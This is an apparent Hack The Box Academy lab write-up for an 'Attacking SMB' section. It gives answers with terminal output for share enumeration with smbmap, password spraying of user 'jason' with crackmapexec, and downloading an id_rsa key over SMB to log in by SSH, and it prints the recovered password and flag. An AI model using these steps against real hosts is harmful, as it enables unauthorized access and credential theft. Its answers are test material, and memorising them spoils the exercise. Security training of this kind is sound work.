# Section 07: Attacking SMB

Module: 11. Attacking Common Services

---

## Questions & Answers

### 1. What is the name of the shared folder with READ permissions?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ smbmap -H 10.129.106.239

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
```

**Answer:** `GGJ`

---

### 2. What is the password for the username "jason"?

Context:
- Password spraying by using the resource password file:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ crackmapexec smb 10.129.106.239 -u jason -p password_resource.list --local-auth
SMB         10.129.106.239  445    ATTCSVC-LINUX    [*] Unix - Samba (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:dolphins STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maddog STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:packers STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jaguar STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:lovers STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nicholas STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:united STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:tiffany STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:maxwell STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:zzzzzz STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:nirvana STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jeremy STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:suckit STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:stupid STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:porn STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:monica STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:elephant STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:giants STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:jackass STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:hotdog STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:rosebud STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:success STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:debbie STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:mountain STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:444444 STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:xxxxxxxx0 STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:warrior STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
SMB         10.129.106.239  445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
```


**Answer:** `34c8zuNBo91!@28Bszh`

---

### 3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

Context:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ smbclient //10.129.106.239/GGJ -U jason
Password for [WORKGROUP\jason]:
session setup failed: NT_STATUS_LOGON_FAILURE
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ 
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ smbclient //10.129.106.239/GGJ -U jason
Password for [WORKGROUP\jason]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 17:33:55 2022
  ..                                  D        0  Mon Apr 18 13:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 17:33:04 2022

		14384136 blocks of size 1024. 10079964 blocks available
smb: \> get id_rsa
getting file \id_rsa of size 3381 as id_rsa (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
smb: \> exit
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ chmod 600 id_rsa 
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-c902axjnby]─[~]
└──╼ [★]$ ssh -i id_rsa jason@10.129.106.239
The authenticity of host '10.129.106.239 (10.129.106.239)' can't be established.
ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.106.239' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 08 Aug 2026 10:21:56 AM UTC

  System load:  0.08               Processes:               231
  Usage of /:   25.5% of 13.72GB   Users logged in:         0
  Memory usage: 14%                IPv4 address for ens160: 10.129.106.239
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ls
flag.txt
$ cat flag.txt
HTB{SMB_4TT4CKS_2349872359}
```

**Answer:** `HTB{SMB_4TT4CKS_2349872359}`

---

[Back to Module Index](./README.md)
